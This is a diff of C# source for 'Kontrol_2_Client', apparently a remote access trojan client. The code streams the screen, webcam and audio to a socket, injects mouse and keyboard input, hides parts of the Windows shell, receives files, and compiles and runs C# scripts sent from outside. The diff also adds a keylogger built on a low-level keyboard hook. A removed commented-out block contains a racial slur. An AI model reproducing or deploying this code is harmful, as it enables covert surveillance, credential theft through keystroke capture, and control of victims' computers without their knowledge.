 						switch (element)
 						{
 							case "taskbar":
-								if (action == "hide")
-									HTaskBar(true);
-								else
-									HTaskBar(false);
+								if (action == "hide") HTaskBar(true);
+								else HTaskBar(false);
 								break;
 							case "desktopIcons":
-								if (action == "hide")
-									HDesktop();
-								else
-									HDesktop();
+								if (action == "hide") HDesktop();
+								else HDesktop();
 								break;
 							case "trayIcons":
-								if (action == "hide")
-									HTrayIcons(true);
-								else
-									HTrayIcons(false);
+								if (action == "hide") HTrayIcons(true);
+								else HTrayIcons(false);
 								break;
 							case "startMenu":
-								if (action == "hide")
-									HStart(true);
-								else
-									HStart(false);
+								if (action == "hide") HStart(true);
+								else HStart(false);
 								break;
 							case "clock":
-								if (action == "hide")
-									HClock(true);
-								else
-									HClock(false);
+								if (action == "hide") HClock(true);
+								else HClock(false);
 								break;
 						}
 					}
@@ -825,7 +882,6 @@ namespace Kontrol_2_Client
 					}
 					else if (cmd == "play_soundfile")
 					{
-
 
 					}
 					else if (cmd.Split('\n')[0] == "t2s_read")
@@ -866,10 +922,8 @@ namespace Kontrol_2_Client
 									{
 										string resolution_size = videoSource.VideoCapabilities[x].FrameSize.ToString();
 										printline(resolution_size);
-										if (x == videoSource.VideoCapabilities.Length)
-											resolutions += resolution_size;
-										else
-											resolutions += resolution_size + "&";
+										if (x == videoSource.VideoCapabilities.Length - 1) resolutions += resolution_size;
+										else resolutions += resolution_size + "&";
 									}
 									Send("remote_webcam\ndevice_resolutions\n" + resolutions);
 									break;
@@ -898,23 +952,19 @@ namespace Kontrol_2_Client
 								int len = 0;
 								string devices_str = "";
 								var enu = new MMDeviceEnumerator();
-								foreach (var dev in enu.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active)) len++;
 								int devices = WaveIn.DeviceCount;
-								for (int i = 0; i < devices; i++)
+                                foreach (var dev in enu.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active)) len++;
+                                for (int i = 0; i < devices - 1; i++)
 								{
 									WaveInCapabilities device = WaveIn.GetCapabilities(i);
-									if (i == devices)
-										devices_str += "C: " + device.ProductName;
-									else
-										devices_str += "C: " + device.ProductName + "&";
+									if (i == devices - 1) devices_str += "C: " + device.ProductName;
+									else devices_str += "C: " + device.ProductName + "&";
 								}
 								foreach (var dev in enu.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active))
 								{
-									printline($"@! Device: {dev.DataFlow} {dev.FriendlyName} {dev.DeviceFriendlyName} {dev.State} {dev.ID}");
-									if (y == len)
-										devices_str += "R: " + dev.FriendlyName + "ID: " + dev.ID;
-									else
-										devices_str += "R: " + dev.FriendlyName + "ID: " + dev.ID + "&";
+									//printline($"@! Device: {dev.DataFlow} {dev.FriendlyName} {dev.DeviceFriendlyName} {dev.State} {dev.ID}");
+									if (y == len - 1) devices_str += "R: " + dev.FriendlyName + "ID: " + dev.ID;
+									else devices_str += "R: " + dev.FriendlyName + "ID: " + dev.ID + "&";
 									y++;
 								}
 								Send("remote_audio\naudio_devices\n" + devices_str);
@@ -923,32 +973,43 @@ namespace Kontrol_2_Client
 								if (xsplit[3] == "renderer")
 								{
 									var capDev = new WasapiLoopbackCapture(new MMDeviceEnumerator().GetDevice(xsplit[2]));
-									Send("remote_audio\n-5\n" + capDev.WaveFormat.SampleRate + "\n" + capDev.WaveFormat.Channels);
+									Send("remote_audio\nr\n" + capDev.WaveFormat.SampleRate + "\n" + capDev.WaveFormat.Channels);
 									try
 									{
 										Audio_Stream(captureDevice: capDev);
 									}
 									catch (Exception ex)
 									{
-										Send("display_msgbox\nAn Error occured on the client side\n1\n1\n@{msg}Error: Either device is in use or something's wrong with my code.\nClick 'OK' to see the full exception.");
-										Send("display_msgbox\nAn Error on the client side\n" + "1\n1" + "\n@{msg}Error: " + ex.Message + "\nStack Trace:" + ex.StackTrace);
+										Send($"display_msgbox" +
+                                            $"\nAn Error occured on the client side" +
+                                            $"\n{(int)MessageBoxButtons.OK}" +
+                                            $"\n{(int)MessageBoxIcon.Error}" +
+                                            $"\n@[msg]Error: Either the the device is in use or my code sucks." +
+                                            $"\nClick 'OK' to see the full exception.");
+										Thread.Sleep(10);
+										Send($"display_msgbox" +
+                                            $"\nAn Error occured on the client side" +
+                                            $"\n{(int)MessageBoxButtons.OK}" +
+                                            $"\n{(int)MessageBoxIcon.Error}" +
+                                            $"\n@[msg]Error: {ex.Message}" +
+                                            $"\nStack Trace: {ex.StackTrace}");
 									}
 								}
 								else
 								{
-									Send("remote_audio\n0");
+									Send("remote_audio\nc\n0\n0");
 									Audio_Stream(int.Parse(xsplit[2]));
 								}
 								break;
 							case "end_stream":
 								if (internalSource == null)
 								{
-									//audioSource.DataAvailable -= audioSource_NewAudio;
+									// audioSource.DataAvailable -= audioSource_NewAudio;
 									audioSource.StopRecording();
 								}
 								else
 								{
-									//internalSource.DataAvailable -= audioSource_NewAudio;
+									// internalSource.DataAvailable -= audioSource_NewAudio;
 									internalSource.StopRecording();
 								}
 								break;
@@ -956,48 +1017,75 @@ namespace Kontrol_2_Client
 					}
 					else if (cmd.StartsWith("remote_desktop"))
 					{
-						string[] xsplit = cmd.Split('\n');
-						switch (xsplit[1])
+						try
 						{
-							case "begin_stream":
-								RemoteDekstop = true;
-								Screen_Stream(xsplit[3], captureCursor: Convert.ToBoolean(xsplit[6]), quality: byte.Parse(xsplit[5]));
-								break;
-							case "end_stream":
-								RemoteDekstop = false;
-								break;
-							case "smcord":
-								try
-								{
-									SetCursorPos(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
-								}
-								catch { }
-								break;
-							case "kpress":
-								try
-								{
-									SendKeys.SendWait(xsplit[2]);
-								}
-								catch { }
-								break;
-							case "lmclk":
-								try
-								{
-									MouseClick(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
-								}
-								catch { }
-								break;
-							case "rmclk":
-								try
-								{
-									MouseClick(int.Parse(xsplit[2]), int.Parse(xsplit[3]), 1);
-								}
-								catch { }
-								break;
+                            string[] xsplit = cmd.Split('\n');
+                            switch (xsplit[1])
+                            {
+                                case "begin_stream":
+                                    remoteDesktop = true;
+                                    Screen_Stream(xsplit[3], captureCursor: Convert.ToBoolean(xsplit[6]), quality: byte.Parse(xsplit[5]));
+                                    break;
+                                case "end_stream":
+                                    remoteDesktop = false;
+                                    break;
+                                case "smcord":
+                                    try
+                                    {
+                                        SetCursorPos(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
+                                    }
+                                    catch { }
+                                    break;
+                                case "kpress":
+                                    try
+                                    {
+                                        SendKeys.SendWait(xsplit[2]);
+                                    }
+                                    catch { }
+                                    break;
+                                case "lmclk":
+                                    try
+                                    {
+                                        MouseClick(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
+                                    }
+                                    catch { }
+                                    break;
+                                case "rmclk":
+                                    try
+                                    {
+                                        MouseClick(int.Parse(xsplit[2]), int.Parse(xsplit[3]), 1);
+                                    }
+                                    catch { }
+                                    break;
+                            }
+                        }
+						catch (SocketException)
+						{
+							Reconnect();
 						}
-
+						catch { }
 					}
-					else if (cmd.StartsWith("display_msgbox"))
+					else if (cmd.StartsWith("keylogger"))
+					{
+						if (cmd.Split('\n')[1] == "start")
+						{
+							runKeyLogger = true;
+                            new Thread(() =>
+                            {
+                                klHook = SetHook(llkProcedure);
+                                Application.Run();
+
+                                //  If the message hook get terminated then we will unhook the Low Level Keyboard Hook
+                                UnhookWindowsHookEx(klHook);
+                            }).Start();
+                        }
+						else runKeyLogger = false;
+                    }
+                    else if (cmd == "test") //  debug test
+                    {
+                        Send($"display_msgbox\nAn Error occured on the client side\n{(int)MessageBoxButtons.OK}\n{(int)MessageBoxIcon.Error}\n@[msg]Error: Either device is in use or something's wrong with my code.\nClick 'OK' to see the full exception.");
+                    }
+                    else if (cmd.StartsWith("display_msgbox"))
 					{
 						string[] xsplit = cmd.Split('\n');
 						if (xsplit.Length <= 1) xsplit = cmd.Split("\\n");
@@ -1055,16 +1143,19 @@ namespace Kontrol_2_Client
 								buttons = MessageBoxButtons.YesNoCancel;
 								break;
 						}
-						MessageBox.Show(cmd.Substring(cmd.IndexOf("@{msg}") + 6), xsplit[1], buttons, icon);
+						MessageBox.Show(cmd.Substring(cmd.IndexOf("@[msg]") + 6), xsplit[1], buttons, icon);
 					}
 					else if (fo_mode == 0)
 					{
-						DownloadFile(data, recieved);
+						DownloadFile(recBuf, recieved);
 					}
 				}
 			}).Start();
 		}
-		public static string Encrypt(string text)
+		#endregion
+
+        #region FUNCTIONS
+        static string Encrypt(string text)
 		{
 			/*string key = "D(G+KbPeSg";
 			byte[] clearBytes = Encoding.Unicode.GetBytes(text);
@@ -1086,7 +1177,8 @@ namespace Kontrol_2_Client
 			}*/
 			return text;
 		}
-		public static string Decrypt(string text)
+
+		static string Decrypt(string text)
 		{
 			/*string key = "D(G+KbPeSg";
 			byte[] cipherBytes = Convert.FromBase64String(text);
@@ -1108,60 +1200,63 @@ namespace Kontrol_2_Client
 			}*/
 			return text;
 		}
-		public static void MouseClick(int x, int y, int leftClick = 0)
+		static void MouseClick(int x, int y, int leftClick = 0)
 		{
 			SetCursorPos(x, y);
 			switch (leftClick)
 			{
 				case 0:
 					mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
-					mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
+					mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0); // Revert the click
 					break;
 				case 1:
 					mouse_event(MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0);
-					mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
-					break;
+					mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0); // Revert the click
+                    break;
 			}
 		}
-		private static long GetDirectorySize2(string folderPath)
+
+		static long GetDirectorySize2(string folderPath)
 		{
 			DirectoryInfo di = new DirectoryInfo(folderPath);
 			return di.EnumerateFiles("*", SearchOption.AllDirectories).Sum(fi => fi.Length);
 		}
+
 		static long GetDirectorySize(string path)
 		{
 			try
 			{
-				// 1
-				// Get array of all file names.
+				//  1
+				//  Get array of all file names.
 				string[] a = Directory.GetFiles(path, "*.*");
 
-				// 2
-				// Calculate total bytes of all files in a loop.
+				//  2
+				//  Calculate total bytes of all files in a loop.
 				long b = 0;
 				foreach (string name in a)
 				{
-					// 3
-					// Use FileInfo to get length of each file.
+					//  3
+					//  Use FileInfo to get length of each file.
 					FileInfo info = new FileInfo(name);
 					b += info.Length;
 				}
-				// 4
-				// Return total size
+				//  4
+				//  Return total size
 				return b;
 			}
 			catch { return 0; }
 		}
-		public static long GetDirectorySizeOld(DirectoryInfo d)
+
+		static long GetDirectorySizeOld(DirectoryInfo d)
 		{
 			long size = 0;
-			// Add file sizes.
+			//  Add file sizes.
 			FileInfo[] fis = d.GetFiles();
 			foreach (FileInfo fi in fis)
 			{
 				size += fi.Length;
 			}
-			// Add subdirectory sizes.
+			//  Add subdirectory sizes.
 			DirectoryInfo[] dis = d.GetDirectories();
 			foreach (DirectoryInfo di in dis)
 			{
@@ -1169,50 +1264,55 @@ namespace Kontrol_2_Client
 			}
 			return size;
 		}
-		public static void HClock(bool hide)
+		static void HClock(bool hide)
 		{
 			if (hide)
 				ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), IntPtr.Zero, "TrayClockWClass", null), SW_HIDE);
 			else
 				ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), IntPtr.Zero, "TrayClockWClass", null), SW_SHOW);
 		}
-		public static void HTaskBar(bool hide)
+
+		static void HTaskBar(bool hide)
 		{
 			if (hide)
 				ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
 			else
 				ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
 		}
-		public static void HDesktop()
+
+		static void HDesktop()
 		{
 			var toggleDesktopCommand = new IntPtr(0x7402);
 			SendMessage(GetDesktopSHELLDLL_DefView(), WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
 		}
-		public static void HTrayIcons(bool hide)
+
+		static void HTrayIcons(bool hide)
 		{
 			if (hide)
 				ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), SW_HIDE);
 			else
 				ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), SW_SHOW);
 		}
-		public static void HStart(bool hide)
+
+		static void HStart(bool hide)
 		{
 			if (hide)
 				ShowWindow(FindWindow("Button", null), SW_HIDE);
 			else
 				ShowWindow(FindWindow("Button", null), SW_SHOW);
 		}
-		public static async void TextToSpeech(string text, int vol = 100, int rate = 0)
+
+		static void TextToSpeech(string text, int vol = 100, int rate = 0)
 		{
 			SpeechSynthesizer synthesizer = new SpeechSynthesizer();
-			synthesizer.Volume = vol;  // 0...100
-			synthesizer.Rate = rate;     // -10...10
-			// Asynchronous
+			synthesizer.Volume = vol;  //  0...100
+			synthesizer.Rate = rate;     //  -10...10
+			//  Asynchronous
 			synthesizer.SpeakAsync(text);
 		}
-		private static int webcamQuality;
-		private static ImageConverter convert = new ImageConverter();
-		public static void WebCam_Stream(int deviceId = 0, int resIndex = 0, int quality = 50)
+
+		static int webcamQuality;
+		static void WebCam_Stream(int deviceId = 0, int resIndex = 0, int quality = 50)
 		{
 			webcamQuality = quality;
 			videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
@@ -1221,17 +1321,18 @@ namespace Kontrol_2_Client
 			videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);
 			videoSource.Start();
 		}
-		private static void videoSource_NewFrame(object sender, NewFrameEventArgs e)
+
+		static void videoSource_NewFrame(object sender, NewFrameEventArgs e)
 		{
 			try
 			{
-				Bitmap frame = (Bitmap)e.Frame.Clone();
-				byte[] header = uniEncoder.GetBytes("servmod^wcstream");
-				byte[] frameBytes = CompressBitmap(frame, webcamQuality);//(byte[])convert.ConvertTo(frame, typeof(byte[]));
-				byte[] data = new byte[frameBytes.Length + 32];
+				Bitmap frame = (Bitmap) e.Frame.Clone();
+				byte[] header = { 0xFE, 0xF2 };
+				byte[] frameBytes = CompressBitmap(frame, webcamQuality);// (byte[])convert.ConvertTo(frame, typeof(byte[]));
+				byte[] data = new byte[frameBytes.Length + 2];
 
-				Buffer.BlockCopy(header, 0, data, 0, header.Length);
-				Buffer.BlockCopy(frameBytes, 0, data, header.Length, frameBytes.Length);
+				Buffer.BlockCopy(header, 0, data, 0, 2);
+				Buffer.BlockCopy(frameBytes, 0, data, 2, frameBytes.Length);
 
 				_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
 
@@ -1239,7 +1340,8 @@ namespace Kontrol_2_Client
 			}
 			catch { }
 		}
-		private static void Audio_Stream(int deviceId = 0, WasapiLoopbackCapture captureDevice = null)
+
+		static void Audio_Stream(int deviceId = 0, WasapiLoopbackCapture captureDevice = null)
 		{
 			if (captureDevice != null)
 			{
@@ -1266,19 +1368,20 @@ namespace Kontrol_2_Client
 				audioSource.StartRecording(); 
 			}
 		}
-		private static void audioSource_NewAudio(object sender, WaveInEventArgs e)
-		{
-			byte[] header = uniEncoder.GetBytes("servmod^austream");
-			byte[] data = new byte[e.BytesRecorded + 32];
 
-			Buffer.BlockCopy(header, 0, data, 0, header.Length);
-			Buffer.BlockCopy(e.Buffer, 0, data, header.Length, e.BytesRecorded);
+		static void audioSource_NewAudio(object sender, WaveInEventArgs e)
+		{
+			byte[] header = { 0xFE, 0xF3 };
+			byte[] data = new byte[e.BytesRecorded + 2];
+
+			Buffer.BlockCopy(header, 0, data, 0, 2);
+			Buffer.BlockCopy(e.Buffer, 0, data, 2, e.BytesRecorded);
 
 			_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
-			//print("\rSize of each audio bit: " + data.Length);
+			// print("\rSize of each audio bit: " + data.Length);
 		}
 
-		private static void Screen_Stream(string resolution, double fps = 30, byte quality = 100, byte screen = 0, bool captureCursor = true, bool hwacc = false)
+		static void Screen_Stream(string resolution, double fps = 30, byte quality = 100, byte screen = 0, bool captureCursor = true, bool hwacc = false)
 		{
 			resolution = resolution.Replace(" ", "");
 			int screenWidth = Screen.AllScreens[screen].Bounds.Width;
@@ -1296,146 +1399,63 @@ namespace Kontrol_2_Client
 				h = Convert.ToInt32(resolution.Split('x')[1]);
 			}*/
 			Send("remote_desktop\nscreen_res\n" + screenWidth.ToString() + "\n" + screenHeight.ToString());
-			if (_DEBUG)
+			if (!hwacc)
 			{
-				if (!hwacc) 
+				/*Stopwatch stopwatch = new Stopwatch();
+                Stopwatch secondsTimer = new Stopwatch();
+                double longest = 0;
+                double least = 0;
+                double current = 0;
+                double average = 0;
+                double secondsPassed = 0;
+
+                long frames = 0; */
+				ImageConverter converter = new ImageConverter();
+				while (remoteDesktop)
 				{
-					/*Stopwatch stopwatch = new Stopwatch();
-					Stopwatch secondsTimer = new Stopwatch();
-					double longest = 0;
-					double least = 0;
-					double current = 0;
-					double average = 0;
-					double secondsPassed = 0;
+                    using (Bitmap bm = new Bitmap(screenWidth, screenHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
+                    {
+                        using (Graphics g = Graphics.FromImage(bm))
+                        {
+                            g.CopyFromScreen(0, 0, 0, 0, bm.Size, CopyPixelOperation.SourceCopy);
+                            // BitBlt too slow
+                            // g.CopyFromScreen((screenWidth / 2) * -1, (screenHeight / 2) * -1, (screenWidth / 2) * -1, (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
+                            // g.CopyFromScreen((screenWidth / 2), (screenHeight / 2) * -1, (screenWidth / 2), (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
+                            // g.CopyFromScreen(screenWidth / 2, screenHeight / 2, screenWidth / 2, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
+                            // g.CopyFromScreen((screenWidth / 2) * -1, screenHeight / 2, (screenWidth / 2) * -1, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
 
-					long frames = 0; */
-					ImageConverter converter = new ImageConverter();
-					while (RemoteDekstop)
-					{
-						/*stopwatch.Start();
-						secondsTimer.Start();*/
+                            if (captureCursor)
+                            {
+                                CURSORINFO pci;
+                                pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
 
-						using (Bitmap bm = new Bitmap(screenWidth, screenHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
-						{
-							using (Graphics g = Graphics.FromImage(bm))
-							{
-								g.CopyFromScreen(0, 0, 0, 0, bm.Size, CopyPixelOperation.SourceCopy);
-								//BitBlt too slow
-								//g.CopyFromScreen((screenWidth / 2) * -1, (screenHeight / 2) * -1, (screenWidth / 2) * -1, (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-								//g.CopyFromScreen((screenWidth / 2), (screenHeight / 2) * -1, (screenWidth / 2), (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-								//g.CopyFromScreen(screenWidth / 2, screenHeight / 2, screenWidth / 2, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-								//g.CopyFromScreen((screenWidth / 2) * -1, screenHeight / 2, (screenWidth / 2) * -1, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
+                                // cursor capture
+                                if (GetCursorInfo(out pci))
+                                {
+                                    if (pci.flags == CURSOR_SHOWING)
+                                    {
+                                        DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
+                                        g.ReleaseHdc();
+                                    }
+                                }
+                            }
 
-								if (captureCursor)
-								{
-									CURSORINFO pci;
-									pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
+                            byte[] imageBytes = CompressBitmap(bm, quality);
 
-									//cursor capture
-									if (GetCursorInfo(out pci))
-									{
-										if (pci.flags == CURSOR_SHOWING)
-										{
-											DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
-											g.ReleaseHdc();
-										}
-									}
-								}
+                            byte[] header = { 0xFE, 0xF1 };
+                            byte[] data = new byte[imageBytes.Length + 2];
 
-								//frames++;
+                            Buffer.BlockCopy(header, 0, data, 0, 2);
+                            Buffer.BlockCopy(imageBytes, 0, data, 2, imageBytes.Length);
 
-								byte[] imageBytes = CompressBitmap(bm, quality); // 18%
-
-								byte[] header = uniEncoder.GetBytes("servmod^scstream");
-								byte[] data = new byte[imageBytes.Length + 32];
-
-								Buffer.BlockCopy(header, 0, data, 0, header.Length);
-								Buffer.BlockCopy(imageBytes, 0, data, 32, imageBytes.Length);
-
-								_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
-
-
-								/*current = stopwatch.ElapsedMilliseconds;
-								if (longest == 0 && least == 0)
-								{
-									longest = current;
-									least = current;
-								}
-								if (current > longest) longest = current;
-								if (current < least) least = current;
-								average = (longest + least) / 2;
-								stopwatch.Stop();
-								stopwatch.Reset();
-								if (secondsTimer.ElapsedMilliseconds > 0)
-								{
-									secondsPassed = secondsTimer.ElapsedMilliseconds / 1000;
-								}
-
-								fps = frames / secondsPassed;*/
-
-								/*printline();
-								printline("Average Frame time: {0}ms", current);
-								printline("Average frame size: {0}bytes", imageBytes.Length);
-								printline("FPS: {0}", fps.ToString("0.00"));
-								printline("Frames: {0}", frames);
-								printline("Seconds Passed: {0}", secondsPassed.ToString("0.00"));
-								printline("Resolution: {0}", resolution);
-								Console.SetCursorPosition(0, Console.CursorTop - 7);*/
-							}
-						}
-					}
-				}
-			}
-			else
-			{
-				if (!hwacc)
-				{
-					while (RemoteDekstop)
-					{
-						using (Bitmap bm = new Bitmap(screenWidth, screenHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
-						{
-							using (Graphics g = Graphics.FromImage(bm))
-							{
-								g.CopyFromScreen(0, 0, 0, 0, bm.Size, CopyPixelOperation.SourceCopy);
-								//BitBlt too slow
-								//g.CopyFromScreen((screenWidth / 2) * -1, (screenHeight / 2) * -1, (screenWidth / 2) * -1, (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-								//g.CopyFromScreen((screenWidth / 2), (screenHeight / 2) * -1, (screenWidth / 2), (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-								//g.CopyFromScreen(screenWidth / 2, screenHeight / 2, screenWidth / 2, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-								//g.CopyFromScreen((screenWidth / 2) * -1, screenHeight / 2, (screenWidth / 2) * -1, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
-
-								if (captureCursor)
-								{
-									CURSORINFO pci;
-									pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
-
-									//cursor capture
-									if (GetCursorInfo(out pci))
-									{
-										if (pci.flags == CURSOR_SHOWING)
-										{
-											DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
-											g.ReleaseHdc();
-										}
-									}
-								}
-
-								byte[] imageBytes = CompressBitmap(bm, quality);
-
-								byte[] header = uniEncoder.GetBytes("servmod^scstream");
-								byte[] data = new byte[imageBytes.Length + 32];
-
-								Buffer.BlockCopy(header, 0, data, 0, header.Length);
-								Buffer.BlockCopy(imageBytes, 0, data, 32, imageBytes.Length);
-
-								_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
-							}
-						}
-					}
-				}
+                            _clientSocket.Send(data, 0, data.Length, SocketFlags.None);
+                        }
+                    }
+                }
 			}
 		}
 
-		private static void DownloadFile(byte[] data, int count)
+		static void DownloadFile(byte[] data, int count)
 		{
 			Console.Write($"\rRecieved: {data.Length} fo_writeSize: {fo_writeSize} fo_size: {fo_size}");
 			Buffer.BlockCopy(data, 0, fileBuffer, fo_writeSize, count);
@@ -1452,11 +1472,12 @@ namespace Kontrol_2_Client
 				Array.Clear(fileBuffer, 0, fileBuffer.Length);
 				Send("file_operation\nfile_uploadFinished");
 			}
-			Thread.Sleep(500); //Let's be friendly to the network bandwidth :)
+			Thread.Sleep(500); // Let's be friendly to the network bandwidth :)
 			Send($"file_operation\ndfprog\n{fo_writeSize}");
 		}
-		//https://www.codeproject.com/Articles/2941/Resizing-a-Photographic-image-with-GDI-for-NET
-		private static Bitmap Resize(Bitmap imgPhoto, int Width, int Height)
+
+		// https:// www.codeproject.com/Articles/2941/Resizing-a-Photographic-image-with-GDI-for-NET
+		static Bitmap Resize(Bitmap imgPhoto, int Width, int Height)
 		{
 			int sourceWidth = imgPhoto.Width;
 			int sourceHeight = imgPhoto.Height;
@@ -1497,8 +1518,9 @@ namespace Kontrol_2_Client
 			grPhoto.Dispose();
 			return bmPhoto;
 		}
-		//https://stackoverflow.com/questions/3034167/compress-bitmap-before-sending-over-network
-		private static byte[] CompressBitmap(Bitmap bmp, long quality)
+
+		// https:// stackoverflow.com/questions/3034167/compress-bitmap-before-sending-over-network
+		static byte[] CompressBitmap(Bitmap bmp, long quality)
 		{
 			using (var mss = new MemoryStream())
 			{
@@ -1511,7 +1533,7 @@ namespace Kontrol_2_Client
 			}
 		}
 
-		private static void RunCSScript(string script, string[] references)
+		static void RunCSScript(string script, string[] references)
 		{
 			string sNamespace = string.Empty;
 			string sClass = string.Empty;
@@ -1523,9 +1545,9 @@ namespace Kontrol_2_Client
 				var tLine = line.Trim();
 				if (tLine.StartsWith("namespace "))
 					sNamespace = tLine.Split(' ')[1];
-				else if (tLine.StartsWith("public class"))
+				else if (tLine.StartsWith("class"))
 					sClass = tLine.Split(' ')[2];
-				else if (tLine.StartsWith("public ") && tLine.Contains('(') && tLine.Contains(')'))
+				else if (tLine.StartsWith("") && tLine.Contains('(') && tLine.Contains(')'))
 				{
 					var name = tLine.Split(' ')[2];
 					if (name.Contains('('))
@@ -1592,7 +1614,7 @@ namespace Kontrol_2_Client
 				foreach (Diagnostic diagnostic in failures)
 				{
 					Console.Error.WriteLine("\t{0}: {1} ({2})", diagnostic.Id, diagnostic.GetMessage(), diagnostic.Location);
-					//ReportError($"An error occured while compiling:\n{diagnostic.Id}: {diagnostic.GetMessage()} :: {diagnostic.Location}");
+					// ReportError($"An error occured while compiling:\n{diagnostic.Id}: {diagnostic.GetMessage()} :: {diagnostic.Location}");
 				}
 			}
 			else
@@ -1609,41 +1631,11 @@ namespace Kontrol_2_Client
 				fileStream.Close();
 				GC.Collect();
 				GC.WaitForPendingFinalizers();
-
-				//APPDOMAIN NOT SUPPORTED ANYMORE
-				/*//AppDomainSetup setup = AppDomain.CurrentDomain.SetupInformation;
-				AppDomain newDomain = AppDomain.CreateDomain("newDomain"); //Create an instance of loader class in new appdomain  
-				System.Runtime.Remoting.ObjectHandle obj = newDomain.CreateInstance(typeof(LoadMyAssembly).Assembly.FullName, typeof(LoadMyAssembly).FullName);
-
-				LoadMyAssembly loader = (LoadMyAssembly)obj.Unwrap();//As the object we are creating is from another appdomain hence we will get that object in wrapped format and hence in the next step we have unwrapped it  
-
-				//Call loadassembly method so that the assembly will be loaded into the new appdomain and the object will also remain in the new appdomain only.  
-				loader.LoadAssembly(ms.ToArray());
-
-				//Call exceuteMethod and pass the name of the method from assembly and the parameters.  
-				loader.ExecuteMainMethod("empty", "Main", sClass, new object[] { "nigger" });
-				AppDomain.Unload(newDomain); //After the method has been executed call the*/
-
-
-				/*var dllPath = temp_file; // dll and deps.json file together .
-				var pc = new PluginLoadContext(dllPath);
-				var assembly = pc.LoadFromAssemblyPath(dllPath);//pc.LoadFromAssemblyName(new AssemblyName(dllPath));
-
-
-				//You can load a reference dll too if you need it
-				//var referenceAssembly = pc.LoadFromAssemblyName(new AssemblyName(Path.GetFileNameWithoutExtension(rnd)));
-
-				//Assembly assembly = AssemblyLoadContext.Default.LoadFromStream(ms);
-				var type = assembly.GetType($"{sNamespace}.{sClass}");
-				var instance = assembly.CreateInstance($"{sNamespace}.{sClass}");
-				var meth = type.GetMember("Main").First() as MethodInfo;
-				meth.Invoke(instance, new object[] { "param" });
-				pc.Unload();*/
 			}
 		}
-		private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs) //microsoft code lol
+		static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs) // microsoft code lol
 		{
-			// Get the subdirectories for the specified directory.
+			//  Get the subdirectories for the specified directory.
 			DirectoryInfo dir = new DirectoryInfo(sourceDirName);
 
 			if (!dir.Exists)
@@ -1655,10 +1647,10 @@ namespace Kontrol_2_Client
 
 			DirectoryInfo[] dirs = dir.GetDirectories();
 
-			// If the destination directory doesn't exist, create it.       
+			//  If the destination directory doesn't exist, create it.       
 			Directory.CreateDirectory(destDirName);
 
-			// Get the files in the directory and copy them to the new location.
+			//  Get the files in the directory and copy them to the new location.
